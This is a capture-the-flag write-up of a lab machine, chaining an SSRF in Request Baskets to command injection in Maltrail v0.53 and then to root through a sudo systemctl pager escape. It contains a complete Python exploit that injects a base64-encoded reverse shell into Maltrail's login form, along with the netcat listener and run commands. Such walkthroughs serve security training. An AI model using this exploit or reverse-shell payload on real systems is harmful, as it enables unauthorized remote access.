#request-basket #Maltrail #weak-permissions #SSRF

### Enumeration

**Start with nmap scan**
```shell
# Nmap 7.94SVN scan initiated Wed Dec 27 21:20:08 2023 as: nmap -sC -sV -oA initial_scan 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (0.052s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Thu, 28 Dec 2023 02:20:43 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Thu, 28 Dec 2023 02:20:17 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Thu, 28 Dec 2023 02:20:17 GMT
|_    Content-Length: 0
```

As seen from the scan results, port 80 filtered. Though we can still try to access port 55555 where a website appears to be hosted.

![request-basket](https://i.imgur.com/mlgSQRp.png)

it is a typical request bin, where it creates a new baskets and gives you a token which you can use to access the basket later.

### Vulnerability Analysis
With a quick Google search for “Request Basket exploits”, we can find this [PoC for CVE-2023–27163](https://github.com/entr0pie/CVE-2023-27163) which exploits a SSRF vulnerability in Request Basket.

### Exploitation
First, create a request basket and adjust its settings as following
![configuration-settings](https://i.imgur.com/o2mYbcv.png)

1. `insecure_tls` set to `true` will bypass certificate verification
2. `proxy_response` set to `true` will send response of the forwarded server back to our client
3. `expand_path` set to `true` makes `forward_url` path `expanded` when original `http` `request` contains `compound` path.

check  Port `80` by visiting  bucket `url` .

It looks like some other application called as `Maltrail` is running on port 80. We also know that its version `v0.53` is running on the server.

![Maltrail Service](https://i.imgur.com/5rkEDdK.png))


Our next vulnerability is that of `RCE (Remote Code Execution)` which is present in the version `0.53` of `Maltrail` service.

**Weaponized Exploit for Maltrail v0.53 Unauthenticated OS Command Injection (RCE)**
```python
'''
  ██████  ██▓███   ▒█████   ▒█████   ██ ▄█▀ ██▓▓█████  ██▀███  
▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▓██▒▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▓███▄░ ▒██▒▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░▓██ █▄ ░██░▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░▒██▒ █▄░██░░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ▒ ░   ░     ░░   ░ 
      ░               ░ ░      ░ ░  ░  ░    ░     ░  ░   ░     
'''

import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

setup netcat
```shell
nc -nlvp 1234
```

run the exploit
```python
python3 exploit.py 10.10.14.8 1234  http://10.10.11.224:55555/m6r2a0h
```

Now, we know the service running on Port `80` is `Mailtrail` of version `0.53` .

![foothold](https://i.imgur.com/HpQWF0U.png)


### Privilege Escalation

**checking for permissions**
```shell
sudo -l
```

![permissions](https://i.imgur.com/hmQeFQd.png)

use `sudo` on `systemctl` to obtained the privilege escalation exploit to break out of the environment and gain root access. 

```shell
sudo /usr/bin/systemctl status trail.service
```
the type `!sh`

![root](https://i.imgur.com/lmuLBLg.png)
